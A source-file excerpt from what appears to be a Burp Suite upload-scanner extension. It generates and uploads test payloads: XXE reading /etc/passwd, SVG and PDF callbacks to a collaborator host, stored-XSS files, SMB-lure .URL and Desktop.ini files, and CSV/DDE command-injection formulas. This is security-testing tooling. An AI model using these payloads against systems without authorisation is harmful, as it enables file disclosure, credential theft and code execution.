            base_svg = root_tag + '<svg xmlns:svg="http://www.w3.org/2000/svg" xmlns="http://www.w3.org/2000/svg" ' \
                                  'xmlns:xlink="http://www.w3.org/1999/xlink" ' \
                                  'width="{}" height="{}">{}</svg>'.format(str(injector.opts.image_width),
                                                                      str(injector.opts.image_height),
                                                                      text_tag)

            # First, the SVG specific ones
            # External Image with <image xlink
            content_xlink = base_svg.replace(text_tag, '<image height="30" width="30" xlink:href="{}image.jpeg" />'.format(BurpExtender.MARKER_COLLAB_URL))
            basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "SvgXlink"
            name = "XXE/SSRF via SVG" # Xlink"
            severity = "High"
            confidence = "Certain"
            detail = "A Burp Colaborator interaction was detected when uploading an SVG image with an Xlink reference " \
                     "which contains a burp colaborator URL. This means that Server Side Request Forgery is possible. " \
                     'The payload was <image height="30" width="30" xlink:href="{}mage.jpeg" /> . ' + \
                     "Usually you will be able to read local files, eg. local pictures. " \
                     "Interactions:<br><br>".format(BurpExtender.MARKER_COLLAB_URL)
            issue = self._create_issue_template(injector.get_brr(), name, detail, confidence, severity)
            colab_tests.extend(self._send_collaborator(injector, burp_colab, self.SVG_TYPES, basename, content_xlink, issue,
                                                  redownload=True))

            # What if the server simply reads the SVG and turn it into a JPEG that has the content?
            # That will be hard to detect (would need something like OCR on JPEG), but at least the user
            # might see that picture... We also regex the download if we detect a passwd...
            basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "SvgPasswdTxt"
            ref = '<?xml version="1.0" encoding="UTF-8" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]>'
            passwd_svg = base_svg
            passwd_svg = passwd_svg.replace(root_tag, ref)
            passwd_svg = passwd_svg.replace(text_tag, '<text x="0" y="20" font-size="20">&xxe;</text>')
            urrs = self._send_simple(injector, self.SVG_TYPES, basename, passwd_svg, redownload=True)
            for urr in urrs:
                if urr and urr.download_rr:
                    resp = urr.download_rr.getResponse()
                    if resp:
                        resp = FloydsHelpers.jb2ps(resp)
                        if BurpExtender.REGEX_PASSWD.match(resp):
                            name = "SVG Local File Include"
                            severity = "High"
                            confidence = "Firm"
                            detail = "A passwd-like response was downloaded when uploading an SVG file with a payload that " \
                                     "tries to include /etc/passwd. Therefore arbitrary file read seems possible. "
                            issue = self._create_issue_template(injector.get_brr(), name, detail, confidence, severity)
                            issue.httpMessagesPy = [urr.upload_rr, urr.download_rr]
                            self._add_scan_issue(issue)


            # Now let's do the generic ones from the Xxe class
            for payload_desc, technique_name, svg in Xxe.get_payloads(base_svg, root_tag, text_tag, 'text'):
                basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "XxeSvg" + technique_name
                name = "XXE/SSRF via SVG" # " + technique_name
                severity = "Medium"
                confidence = "Certain"
                detail = "A Burp Colaborator interaction was detected when uploading an SVG image with an " + technique_name + " payload " \
                         "which contains a burp colaborator URL. This means that Server Side Request Forgery is possible. " \
                         'The payload was ' + cgi.escape(payload_desc) + ' . ' \
                         "Usually you will be able to read local files, eg. local pictures. " \
                         "This issue needs further manual investigation. " \
                         "Interactions:<br><br>"
                issue = self._create_issue_template(injector.get_brr(), name, detail, confidence, severity)
                colab_tests.extend(
                    self._send_collaborator(injector, burp_colab, self.SVG_TYPES, basename, svg, issue,
                                            redownload=True))

        return colab_tests

    def _xxe_svg_external_java_archive(self, injector, burp_colab):
        colab_tests = []
        # Burp community edition doesn't have Burp collaborator
        if not burp_colab:
            return colab_tests
        if injector.opts.file_formats['svg'].isSelected():
            # The standard file we are going to use for the tests:
            base_svg = '<svg xmlns:svg="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" ' \
                       'version="1.0"><script type="application/java-archive" xlink:href="{}evil.jar' \
                       '"/><text>test</text></svg>'.format(BurpExtender.MARKER_COLLAB_URL)
            basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "SvgScriptJava"
            name = "SVG Script Xlink Java Archive"
            severity = "Medium"
            confidence = "Certain"
            detail = "A Burp Colaborator interaction was detected when uploading an SVG image with a script tag with a Xlink reference " \
                     "which contains a burp colaborator URL. This means that Server Side Request Forgery is at least possible. " \
                     "However, it is also likely that this results in Remote Command Execution if the JAR file is downloaded and executed. " \
                     "See the following metasploit module as an example for RCE: " \
                     "https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/misc/batik_svg_java.rb " \
                     'The payload was <script type="application/java-archive" xlink:href="{}evil.jar"/> . ' \
                     "Usually you will be able to read local files, eg. local pictures. " \
                     "Interactions:<br><br>".format(BurpExtender.MARKER_COLLAB_URL)
            issue = self._create_issue_template(injector.get_brr(), name, detail, confidence, severity)
            colab_tests.extend(self._send_collaborator(injector, burp_colab, self.SVG_TYPES, basename, base_svg, issue, redownload=True))
        return colab_tests

    def _xxe_xml(self, injector, burp_colab):
        colab_tests = []
        # Burp community edition doesn't have Burp collaborator
        if not burp_colab:
            return colab_tests
        if injector.opts.file_formats['xml'].isSelected():
            # The standard file we are going to use for the tests:
            root_tag = '<?xml version="1.0" encoding="UTF-8" standalone="no"?>' \
                       '<!DOCTYPE test [ \n <!ELEMENT text ANY> \n]>'
            test_tag = '<text>test</text>'
            base_xml = root_tag + test_tag

            for payload_desc, technique_name, xml in Xxe.get_payloads(base_xml, root_tag, test_tag, 'text'):
                basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "XxeXml" + technique_name
                name = "XML " + technique_name + " SSRF/XXE"
                severity = "Medium"
                confidence = "Certain"
                detail = "A Burp Colaborator interaction was detected when uploading an XML file with an " + technique_name + " payload " \
                         "which contains a burp colaborator URL. This means that Server Side Request Forgery is possible. " \
                         'The payload was ' + cgi.escape(payload_desc) + ' . ' \
                         "Usually you will be able to read local files and do SSRF. This issue needs further manual investigation." \
                         "Interactions:<br><br>"
                issue = self._create_issue_template(injector.get_brr(), name, detail, confidence, severity)
                colab_tests.extend(self._send_collaborator(injector, burp_colab, self.XML_TYPES, basename, xml, issue, redownload=True))

        return colab_tests

    def _xxe_office(self, injector, burp_colab):
        colab_tests = []
        # Burp community edition doesn't have Burp collaborator
        if not burp_colab:
            return colab_tests
        x = XxeOfficeDoc(injector.opts.get_enabled_file_formats())
        for payload, name, ext, content in x.get_files():
            basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "XxeOffice" + name
            title = "XXE/SSRF via XML" # " + ext[1:].upper()
            desc = 'XXE through injection of XML {} payloads in the contents of a {} file. The server parsed the code ' \
                   '{} which resulted in a SSRF. '.format(name, ext[1:].upper(), cgi.escape(payload))
            issue = self._create_issue_template(injector.get_brr(), title, desc, "Firm", "High")
            types = [
                ('', ext, ''),
                ('', ext, XxeOfficeDoc.EXTENSION_TO_MIME[ext]),
            ]
            c = self._send_collaborator(injector, burp_colab, types, basename, content, issue,
                                        replace=x._inject_burp_url, redownload=True)
            colab_tests.extend(c)
        return colab_tests

    def _xxe_xmp(self, injector, burp_colab):
        # Burp community edition doesn't have Burp collaborator
        if not burp_colab:
            return []
        # This is a pretty special case...
        # As we need to fix the XMP metadata length *after* injecting the Burp collaborator URL
        # in the XMP, we can not use functions such as _send_burp_collaborator.
        # Additionally, we would like to (Ab)use the BackdooredFile class to produce the basic
        # Images with XMP tags.
        # Therefore this was entirely implemented in its own class... not a beauty, but it works
        x = XxeXmp(injector.opts.get_enabled_file_formats(), self._global_opts.image_exiftool, injector.opts.image_width,
                   injector.opts.image_height, BurpExtender.MARKER_ORIG_EXT, BurpExtender.PROTOCOLS_HTTP, self.FILE_START,
                   self._make_http_request)
        return x.do_collaborator_tests(injector, burp_colab, injector.opts.get_enabled_file_formats())

    def _xss_html(self, injector):
        if injector.opts.file_formats['html'].isSelected():
            basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "HtmlXss"
            content = '<html><head></head><body>this is just a little html</body></html>'
            title = "Cross-site scripting (stored)" # via HTML file upload"
            desc = 'XSS via HTML file upload and download. '
            issue = self._create_issue_template(injector.get_brr(), title, desc, "Firm", "High")
            self.dl_matchers.add(DownloadMatcher(issue, filecontent=content, check_xss=True))
            self._send_simple(injector, self.HTML_TYPES, basename, content, redownload=True)
        return []

    def _xss_svg(self, injector):
        if injector.opts.file_formats['svg'].isSelected():
            basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "SvgXss"
            content_svg = '<?xml version="1.0" standalone="no"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" ' \
                          '"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg version="1.1" baseProfile="full" ' \
                          'xmlns="http://www.w3.org/2000/svg" width="{}" height="{}"><polygon id="triangle" ' \
                          'points="0,0 0,0 0,0" stroke="#004400"/><script type="text/javascript">prompt();' \
                          '</script></svg>'.format(str(injector.opts.image_width), str(injector.opts.image_height))
            title = "Cross-site scripting (stored)" # via SVG"
            desc = 'XSS through SVG upload and download as SVG can include JavaScript and will execute same origin.'
            issue = self._create_issue_template(injector.get_brr(), title, desc, "Firm", "High")
            self.dl_matchers.add(DownloadMatcher(issue, filecontent=content_svg, check_xss=True))
            self._send_simple(injector, self.SVG_TYPES, basename, content_svg, redownload=True)
        return []

    def _xss_swf(self, injector):
        if injector.opts.file_formats['swf'].isSelected():
            basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "XssProject"
            content = 'Q1dTDmkGAAB4AWVU3VLbRhTe1dqW/2UDMeBAozQ0jgm2ZMMwgyGeUgwZbiATXyTDoPEs0gorkbUaScZmOpm+SSe96Wv0AXLjXrQP0KvO9KLuE6QriSB' \
                      'MNKOfPec7335nzzkag9hfAOR/BWAJgk5xGQDw0/wnCMCeo+mt150jcTwwLbfFVi8qfc+zW5I0Go3qo806dS6lxs7OjiQ3pWazxhA199ry8LhmuU8q7' \
                      'YCgQ1zVMWzPoJboE+ILOvReVCo3rJp6S2oPHTOg1FSJmGRALM+VGvUGI9LUlk6dAfba2LZNQ8U+nTSuuX2qvh/hK1LTTez296QI6Md4hmeS9r5GL4h' \
                      '4ZJKxuCXuR/EBOoT4YC0S2r6TJvaj6yodSLZDtaHKNOmMKgi+G+JT2MML03D7xGkPrfcWHVkBKrL6GNUh2KOziC82329i63KIL0n78CSIvl0HGrFH2' \
                      'if0SmzIG2JTbjRDGb51T/JP985p31hYAdsgXxgun5zWXu13u29OX3fARGBVnrk6hb/RHjjgPn/+fJZGzJVgdyzxy1mIyuCf/2mxnviUftvtvnLoO6J' \
                      '64LeFbAwAZgV3jAVQ90Oe3wUqB63zDlWHQUlFbGlil3ieYV265/vawLAM13P8Q2GrsFSsluIPQ8PUiCNu1bfPI/5z11F3d6N1HbvZaLUmJ7tEHTqGd' \
                      '50NOqLuXrseGcD1DDZNOurQATas4uHYI46FzWOLvXWsknwIJjf2uQF23D6LOByrJGhdV5Crux9Y36n9Z6T644fdmEOplzYpZhKPLZ2mbezgAWF8Lvf' \
                      'OFSJJTOCa/PimoaJm2u9uSk1Z3pYuWJrsKBZCBZrh2ia+bnVtlgNZmzV2QufphX/6B5QNmmER59EsKMgJq55xRULgw1n/DMlK6CNX/qy1Dv2X7/fTJ' \
                      'A4nSTGVHUL80HGoA0mcFUklD6LUpOgzN7NJIpSfCAUI93hvKhNumpvRU/xKfWnGf5v0Sq93SXse7amsbXoa0VkT+f+EXp+YNrKpixrbm4tfQPf9jcZ' \
                      'WMQ5LiRJXSseLi1xybgmWYXm+vFB+UC6VF0vflL7lchDF4gk+mUpnsrn8As/FeZTkYykeZXiU41GeR0KqAHm0zKMyjx7yaIVHkBce8UjkC4954Qkvr' \
                      'PHCd2yYODYQq+zBAe4prDyrwso6zOVTyWB2IAdzHch8EAEIkyk0kV+yqUIoLfT/Q9PkRH6z/of8L4yB5DQ1OQbTtAJ1uMEfcbA6zShIR09xbJr3Pza' \
                      'ySlyP6wmd15MfN5Y+HqUYRCisADCRf5fPwPqf6/LzAZwWlCzhTHiUhdXVJDedewmrB8fpDOA4JmBnIrNtEwQogi7ISkEvyEpRL8rKnD4nK/P6vKzk9' \
                      'XzweAtWg6ufYxFxplqYv/c3+J5l/j9Txem0'
            content = content.decode("base64")
            title = "Cross-site scripting (stored)" # via SWF"
            desc = 'XSS through SWF file (Adobe Flash) upload and download. ' \
                   'See https://soroush.secproject.com/blog/2012/11/xss-by-uploadingincluding-a-swf-file/ for more details. ' \
                   'There might be other issues with file uploads that allow .swf uploads, for example https://hackerone.com/reports/51265 .'
            issue = self._create_issue_template(injector.get_brr(), title, desc, "Firm", "Medium")
            # TODO feature: Check if other content_types work too rather than only application/x-shockwave-flash...
            # TODO feature: Also, check_xss means the swf can not be delivered with Content-Disposition: attachment... correct?
            self.dl_matchers.add(DownloadMatcher(issue, filecontent=content, check_xss=True))
            self._send_simple(injector, self.SWF_TYPES, basename, content, redownload=True)
        return []

    def _xss_payload(self):
        r = ''.join(random.sample(string.ascii_letters, 10))
        payload = '<b>' + r + '</b>'
        expect = payload
        return payload, expect

    def _xss_backdoored_file(self, injector):
        bi = BackdooredFile(injector.opts.get_enabled_file_formats(), self._global_opts.image_exiftool)
        size = (injector.opts.image_width, injector.opts.image_height)
        for payload, expect, name, ext, content in bi.get_files(size, self._xss_payload):
            basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "BfXss" + name
            title = "Cross-site scripting (stored)" # via " + ext[1:].upper() + " Metadata"
            desc = 'XSS through injection of HTML in Metadata of type ' + name + '. The server ' \
                    'reflected the code ' + cgi.escape(
                payload) + ' inside the uploaded file and used a content-type that ' \
                    'works for XSS, meaning that HTML injection is possible.'
            issue = self._create_issue_template(injector.get_brr(), title, desc, "Firm", "High")
            self.dl_matchers.add(DownloadMatcher(issue, filecontent=expect, check_xss=True))
            self._send_simple(injector, self.HTML_TYPES, basename, content, redownload=True)
        return []


    def _eicar(self, injector):
        # it would be easy to add GTUBE (spam detection test file), but there seems to be too little benefit for that
        # https://en.wikipedia.org/wiki/GTUBE
        # Additionally, it is hard to test if "illegal" content such as adult content can be uploaded as
        # there is no test file for that.
        basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "Eicar"
        content_eicar = "WDVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDK" + "Td9JEVJQ0FSLVNUQU5EQVJEL" + "UFOVElWSVJVUy1URVNULUZJTEUhJEgrSCo="
        content_eicar = content_eicar.decode("base64")
        title = "Malicious Eicar upload/download"
        desc = 'The eicar antivirus test file was uploaded and downloaded. That probably means there is no antivirus' \
               'installed on the server. That reduces the attack surface (attackers can not attack the antivirus ' \
               'software) but if any uploaded files are ever executed, then malware is not detected. You should try ' \
               'to upload an executable (e.g. with the recrusive uploader module of the UploadScanner).'
        issue = self._create_issue_template(injector.get_brr(), title, desc, "Tentative", "Low")
        self.dl_matchers.add(DownloadMatcher(issue, filecontent=content_eicar))
        self._send_simple(injector, self.EICAR_TYPES, basename, content_eicar, redownload=True)
        return []

    def _pdf(self, injector, burp_colab):

        # TODO: Check if this should be implemented: http://michaeldaw.org/backdooring-pdf-files

        colab_tests = []

        if injector.opts.file_formats['pdf'].isSelected():
            #A boring PDF with some JavaScript
            basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "PdfJavascript"
            content = '%PDF-1.0\n%\xbf\xf7\xa2\xfe\n%QDF-1.0\n\n%% Original object ID: 1 0\n1 0 obj\n<<\n  /AA <<\n    ' \
                      '/WC <<\n      /JS (app.alert\\("http://www.corkami.com \\(Closing\\)"\\);)\n      /S /\n    >>\n' \
                      '  >>\n  /OpenAction <<\n    /JS (app.alert\\("http://www.corkami.com \\(Open Action\\)"\\);)\n  ' \
                      '  /S /JavaScript\n  >>\n  /Pages 2 0 R\n>>\nendobj\n\n%% Original object ID: 2 0\n2 0 obj\n<<\n ' \
                      ' /Count 1\n  /Kids [\n    3 0 R\n  ]\n>>\nendobj\n\n%% Page 1\n%% Original object ID: 3 0\n3 0 ' \
                      'obj\n<<\n  /AA <<\n    /O <<\n      /JS (app.alert\\("http://www.corkami.com \\(Additional Action' \
                      '\\)"\\);)\n      /S /JavaScript\n    >>\n  >>\n  /Parent 2 0 R\n>>\nendobj\n\nxref\n0 4\n0000000000 ' \
                      '65535 f \n0000000052 00000 n \n0000000328 00000 n \n0000000422 00000 n \ntrailer <<\n  /Root 1 0 ' \
                      'R\n  /Size 4\n  /ID [<a35f6bb80bdac8e3c95c298f6177b175><a35f6bb80bdac8e3c95c298f6177b175>]\n>>\n' \
                      'startxref\n585\n%%EOF\n'
            title = "Malicious PDF with JavaScript upload/download"
            desc = 'A PDF file was uploaded and downloaded that has JavaScript content. The PDF pops JavaScript alerts.' \
                    'This only proofs that PDFs can be uploaded, that have active content. If a user executes the JavaScript code after downloading, ' \
                    'malicious code could potentially be executed. You should also try uploading a bad PDF, which will probably work as well. Bad PDF is described' \
                   'here: https://github.com/deepzec/Bad-Pdf and https://research.checkpoint.com/ntlm-credentials-theft-via-pdf-files/ . Although they ' \
                   'claim that it works in any PDF reader, it did not work in IE\'s built-in PDF reader, but it did work in Adobe Reader.<br><br>' \
                   'The file that was uploaded here is from Ange Albertini and located at https://github.com/corkami/pocs/blob/master/pdf/javascript.pdf'
            issue = self._create_issue_template(injector.get_brr(), title, desc, "Tentative", "Low")
            self.dl_matchers.add(DownloadMatcher(issue, filecontent=content))
            self._send_simple(injector, self.PDF_TYPES, basename, content, redownload=True)

            # Burp community edition doesn't have Burp collaborator
            if not burp_colab:
                return colab_tests

            # Bad PDF with Collaborator payload according to https://github.com/deepzec/Bad-Pdf/blob/master/badpdf.py
            content = '''%PDF-1.7
1 0 obj
<</Type/Catalog/Pages 2 0 R>>
endobj
2 0 obj
<</Type/Pages/Kids[3 0 R]/Count 1>>
endobj
3 0 obj
<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Resources<<>>>>
endobj
xref
0 4
0000000000 65535 f
0000000015 00000 n
0000000060 00000 n
0000000111 00000 n
trailer
<</Size 4/Root 1 0 R>>
startxref
190
3 0 obj
<< /Type /Page
   /Contents 4 0 R
   /AA <<
	   /O <<
	      /F (\\\\\\\\test.example.org\\\\test)
		  /D [ 0 /Fit]
		  /S /GoToE
		  >>
	   >>
	   /Parent 2 0 R
	   /Resources <<
			/Font <<
				/F1 <<
					/Type /Font
					/Subtype /Type1
					/BaseFont /Helvetica
					>>
				  >>
				>>
>>
endobj
4 0 obj<< /Length 100>>
stream
BT
/TI_0 1 Tf
14 0 0 14 10.000 753.976 Tm
0.0 0.0 0.0 rg
(PDF Document) Tj
ET
endstream
endobj
trailer
<<
	/Root 1 0 R
>>
%%EOF
'''
            basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "BadPdf"
            title_download = "Malicious PDF with JavaScript upload/download"
            title_colab = "Bad PDF interaction"
            base_detail = 'The payload was the bad PDF as described here: https://github.com/deepzec/Bad-Pdf/blob/master/badpdf.py . ' \
                          "Usually you will be able to steal NTLM credentials and similar request forgery scenarios. "
            detail_download = 'A PDF file was uploaded and downloaded that includes a payload. A user who downloades ' \
                              'the file and openes it in Adobe reader might execute the payload. <br><br> {} <br>'.format(base_detail)
            detail_colab = "A Burp Colaborator interaction was detected when uploading an PDF file with a pointer to an external " \
                     "burp colaborator URL. This means that Server Side Request Forgery might be possible " \
                     "or that a user downloaded the file and opened it in Adobe reader. <br><br> {} <br>" \
                     "Interactions:<br><br>".format(base_detail)
            issue_download = self._create_issue_template(injector.get_brr(), title_download, detail_download, "Tentative", "Low")
            issue_colab = self._create_issue_template(injector.get_brr(), title_colab, detail_colab, "Firm", "High")
            self.dl_matchers.add(DownloadMatcher(issue_download, filecontent=content))
            self._send_simple(injector, self.PDF_TYPES, basename + "Mal", content, redownload=True)
            colab_tests.extend(self._send_collaborator(injector, burp_colab, self.PDF_TYPES, basename + "Colab", content, issue_colab,
                               replace="test.example.org", redownload=True))

            content = '''% a pdf file where javascript code is evaluated for execution

% BSD Licence, Ange Albertini, 2011

%PDF-1.4
1 0 obj
<<>>
%endobj

trailer
<<
/Root
  <</Pages <<>>
  /OpenAction
      <<
      /S/JavaScript
      /JS(
      eval(
          'app.openDoc({cPath: encodeURI("'''+BurpExtender.MARKER_COLLAB_URL+'''"), cFS: "CHTTP" });'
          );
      )
      >>
  >>
>>'''
            basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "JsOpenDocPdf"
            title_download = "Malicious PDF with JavaScript upload/download"
            title_colab = "PDF JavaScript openDoc interaction"
            base_detail = 'The payload was a PDF JavaScript with app.openDoc, similar to the one here: ' \
                          'https://github.com/corkami/pocs/blob/master/pdf/js-eval.pdf .'
            detail_download = 'A PDF file was uploaded and downloaded that includes a payload. A user who downloades ' \
                              'the file and openes it in Adobe reader might execute the payload. <br><br> {} <br>'.format(base_detail)
            detail_colab = "A Burp Colaborator interaction was detected when uploading an PDF file with a pointer to an external " \
                           "burp colaborator URL. This means that Server Side Request Forgery might be possible " \
                           "or that a user downloaded the file and opened it in Adobe reader. <br><br> {} <br>" \
                           "Interactions:<br><br>".format(base_detail)
            issue_download = self._create_issue_template(injector.get_brr(), title_download, detail_download, "Tentative", "Low")
            issue_colab = self._create_issue_template(injector.get_brr(), title_colab, detail_colab, "Firm", "High")
            self.dl_matchers.add(DownloadMatcher(issue_download, filecontent=content))
            self._send_simple(injector, self.PDF_TYPES, basename + "Mal", content, redownload=True)
            colab_tests.extend(self._send_collaborator(injector, burp_colab, self.PDF_TYPES, basename + "Colab", content, issue_colab,
                                                       redownload=True))

            content = '''% a PDF file using an XFA
% most whitespace can be removed (truncated to 570 bytes or so...)
% Ange Albertini BSD Licence 2012

% modified by InsertScript

%PDF-1. % can be truncated to %PDF-\0

1 0 obj <<>>
stream
<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
<config><present><pdf>
    <interactive>1</interactive>
</pdf></present></config>

<template>
    <subform name="_">
        <pageSet/>
        <field id="Hello World!">
            <event activity="docReady" ref="$host" name="event__click">
               <submit
                     textEncoding="UTF-16"
                     xdpContent="pdf datasets xfdf"
                     target="{}test"/>
            </event>

</field>
    </subform>
</template>
</xdp:xdp>
endstream
endobj

trailer <<
    /Root <<
        /AcroForm <<
            /Fields [<<
                /T (0)
                /Kids [<<
                    /Subtype /Widget
                    /Rect []
                    /T ()
                    /FT /Btn
                >>]
            >>]
            /XFA 1 0 R
        >>
        /Pages <<>>
    >>
>>'''.format(BurpExtender.MARKER_COLLAB_URL)
            basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "FormSubmitPdf"
            title_download = "Malicious PDF with JavaScript upload/download"
            title_colab = "PDF form submit interaction"
            base_detail = 'The payload was an auto submit PDF form, similar to the one here: ' \
                          'https://insert-script.blogspot.ch/2018/05/adobe-reader-pdf-client-side-request.html .'
            detail_download = 'A PDF file was uploaded and downloaded that includes a payload. A user who downloades ' \
                              'the file and openes it in Adobe reader might execute the payload. <br><br> {} <br>'.format(base_detail)
            detail_colab = "A Burp Collaborator interaction was detected when uploading an PDF file with a pointer to an external " \
                           "burp collaborator URL. This means that Server Side Request Forgery might be possible " \
                           "or that a user downloaded the file and opened it in Adobe reader. <br><br> {} <br>" \
                           "Interactions:<br><br>".format(base_detail)
            issue_download = self._create_issue_template(injector.get_brr(), title_download, detail_download, "Tentative", "Low")
            issue_colab = self._create_issue_template(injector.get_brr(), title_colab, detail_colab, "Firm", "High")
            self.dl_matchers.add(DownloadMatcher(issue_download, filecontent=content))
            self._send_simple(injector, self.PDF_TYPES, basename + "Mal", content, redownload=True)
            colab_tests.extend(self._send_collaborator(injector, burp_colab, self.PDF_TYPES, basename + "Colab", content, issue_colab,
                                                       redownload=True))

        return colab_tests

    def _ssrf(self, injector, burp_colab):
        colab_tests = []
        # Burp community edition doesn't have Burp collaborator
        if not burp_colab:
            return colab_tests

        # shortcut.url files for Windows
        content = '[InternetShortcut]\r\n' \
                  'URL=http://test.example.org/\r\n' \
                  'WorkingDirectory=\\\\test.example.org\SMBShare\r\n' \
                  'ShowCommand=7\r\n' \
                  'Modified=20F06BA06D07BD014D\r\n' \
                  'HotKey=1601'
        basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "UrlInternetShortcut"
        title_download = "Malicious URL file upload/download"
        title_colab = "URL file interaction"
        base_detail = 'The payload was a Windows .URL shortcut file, similar to the one here: ' \
                      'https://insert-script.blogspot.ch/2018/05/dll-hijacking-via-url-files.html .'
        detail_download = 'A .URL file was uploaded and downloaded that includes a payload. A user who downloades ' \
                          'the file and openes it in on Windows might execute the payload and interact with an attacker ' \
                          'supplied SMB server. <br><br> {} <br>'.format(base_detail)
        detail_colab = "A Burp Collaborator interaction was detected when uploading an .URL file with a pointer to an external " \
                       "burp collaborator URL. This means that Server Side Request Forgery might be possible " \
                       "or that a user downloaded the file and opened it in on Windows. <br><br> {} <br>" \
                       "Interactions:<br><br>".format(base_detail)
        issue_download = self._create_issue_template(injector.get_brr(), title_download, detail_download, "Tentative", "Low")
        issue_colab = self._create_issue_template(injector.get_brr(), title_colab, detail_colab, "Firm", "High")
        self.dl_matchers.add(DownloadMatcher(issue_download, filecontent=content))
        self._send_simple(injector, self.URL_TYPES, basename + "Mal", content, redownload=True)
        colab_tests.extend(self._send_collaborator(injector, burp_colab, self.URL_TYPES, basename + "Colab", content, issue_colab,
                                                   redownload=True, replace="test.example.org"))

        # The same with Desktop.ini
        content = '[.ShellClassInfo]\r\n' \
                  'IconResource=\\\\test.example.org\\\r\n'
        basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "DesktopIni"
        title_download = "Malicious Desktop.ini file upload/download"
        title_colab = "URL file interaction"
        base_detail = 'The payload was a Windows Desktop.ini file, similar to the one here: ' \
                      'https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/ .'
        detail_download = 'A .ini file was uploaded and downloaded that includes a payload. A user who downloads ' \
                          'the file and openes it in on Windows might execute the payload and interact with an attacker ' \
                          'supplied SMB server. <br><br> {} <br>'.format(base_detail)
        detail_colab = "A Burp Collaborator interaction was detected when uploading an .ini file with a pointer to an external " \
                       "burp collaborator URL. This means that Server Side Request Forgery might be possible " \
                       "or that a user downloaded the file and opened it in on Windows. <br><br> {} <br>" \
                       "Interactions:<br><br>".format(base_detail)
        issue_download = self._create_issue_template(injector.get_brr(), title_download, detail_download, "Tentative", "Low")
        issue_colab = self._create_issue_template(injector.get_brr(), title_colab, detail_colab, "Firm", "High")
        self.dl_matchers.add(DownloadMatcher(issue_download, filecontent=content))
        self._send_simple(injector, self.INI_TYPES, "Desktop", content, redownload=True, randomize=False)
        colab_tests.extend(self._send_collaborator(injector, burp_colab, self.INI_TYPES, "Desktop", content, issue_colab,
                                                   redownload=True, replace="test.example.org", randomize=False))

        return colab_tests

    def _csv_spreadsheet(self, injector, burp_colab):
        colab_tests = []

        if injector.opts.file_formats['csv'].isSelected():
            title_download = "Malicious CSV upload/download"
            desc_download = 'A CSV with the content {} was uploaded and downloaded. When this spreadsheet is opened in {}, ' \
                            'and the user confirms several dialogues warning about code execution, the supplied command is executed. See ' \
                            'https://www.contextis.com/resources/blog/comma-separated-vulnerabilities/ for more details. '
            title_colab = "Malicious CSV Collaborator Interaction"
            desc_colab = 'A CSV with the content {} was uploaded and lead to command execution. When this spreadsheet is opened in {}, ' \
                         'and the user confirms several dialogues warning about code execution, the supplied command is executed. See ' \
                         'https://www.contextis.com/resources/blog/comma-separated-vulnerabilities/ for more details. '
            software_payload = (("Excel", "=cmd|' /C {} {}'!A0"), ("OpenOffice", '=DDE("cmd";"/C {} {}";"__DdeLink_60_870516294")'))
            for software_name, payload in software_payload:
                basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "Csv" + software_name
                formula = payload.format("nslookup", "unknown.domain.example.org")
                issue = self._create_issue_template(injector.get_brr(), title_download, desc_download.format(formula, software_name), "Tentative", "Low")
                # Do simple upload/download based
                self.dl_matchers.add(DownloadMatcher(issue, filecontent=formula))
                self._send_simple(injector, self.CSV_TYPES, basename + "Mal", formula, redownload=True)
                # TODO: Decide if additional sleep based payloads would make sense, probably rather not
                if burp_colab:
                    # Also do collaborator based:
                    for cmd_name, cmd, server, replace in self._get_rce_interaction_commands(injector, burp_colab):
                        formula = payload.format(cmd, server)
                        desc = desc_colab + "<br>In this case we actually detected that interactions took place when using a {} command," \
                                "meaning the server executed the payload or someone opened it in the {} spreadsheet software. <br>" \
                                "The payload was {} . <br>" \
                                "Interactions: <br><br>".format(cmd_name, software_name, formula)
                        issue = self._create_issue_template(injector.get_brr(), title_colab, desc, "Firm", "High")
                        file_contents = []
                        file_contents.append(formula)
                        # Detect if original uploaded file was CSV, how many columns, etc., then start injecting CSV
                        # specific payloads such as the formulas above, but *only* if we detect an uploaded CSV
                        insertion_points = InsertionPointProviderForActiveScan(injector).get_csv_insertion_points(injector)
                        for insertion_point in insertion_points:
                            # Inject the formula into each field
                            _, _, content = insertion_point.create_request(formula)
                            file_contents.append(content)
                            # Injecting a collaborator URL with http:// and https:// etc. would be possible here
                            # but as we already pass this as an insertion point for active scan we don't do this here
                        for index, content in enumerate(file_contents):
                            colab_tests.extend(self._send_collaborator(injector, burp_colab, self.CSV_TYPES, basename + "Colab" + str(index),
                                                                        content, issue, replace=replace, redownload=True))

        if injector.opts.file_formats['xlsx'].isSelected():
            basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "Excel"
            content_excel = 'eJztXQk8lNvfPzPGGFuWZC2mspWxr10hSUrIUilClkER7ljaiKJFi6JVud26bpcWktJKom5SlEjlqlvaQ2mn5TbvOc8YM/PMGLzL//O+/3d+Ps8zz/Ob' \
